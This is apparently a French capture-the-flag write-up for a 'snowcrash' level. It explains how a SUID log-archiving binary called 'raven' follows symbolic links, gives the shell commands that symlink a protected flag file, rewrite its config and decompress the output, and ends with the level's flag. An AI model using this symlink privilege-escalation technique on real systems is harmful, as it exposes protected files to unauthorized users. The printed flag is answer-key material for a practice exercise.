# Level 06 → Level 07

**Mot de passe du niveau :** flag de `level05`

## Cible
`/opt/snowcrash/level06/raven`

## Vulnérabilité
Le binaire `raven` (SUID `flag06`) est un gestionnaire de logs configurable via
`/etc/raven/raven.conf`. Deux faiblesses combinées :
- il suit les **liens symboliques** dans son répertoire de logs ;
- il propose une fonction d'**archivage** (`enable_archive`) qui écrit les
  fichiers en sortie compressés (gzip).

On pointe donc un lien symbolique vers `/home/flag06/.flag` et on laisse `raven`
lire ce fichier avec ses privilèges, puis on décompresse la sortie.

## Exploitation
```bash
mkdir -p /tmp/raven/archive
ln -s /home/flag06/.flag /tmp/raven/flag.log
cat > /etc/raven/raven.conf << 'CONF'
log_dir          = /tmp/raven
enable_archive   = 1
archive_days     = 0
archive_dir      = /tmp/raven/archive
...
CONF
/opt/snowcrash/level06/raven | gzip -d
```
Voir `ressource/exploit.sh` pour la config complète.

## Flag
```
wizelohxamaiuiia2uinaes4a
```
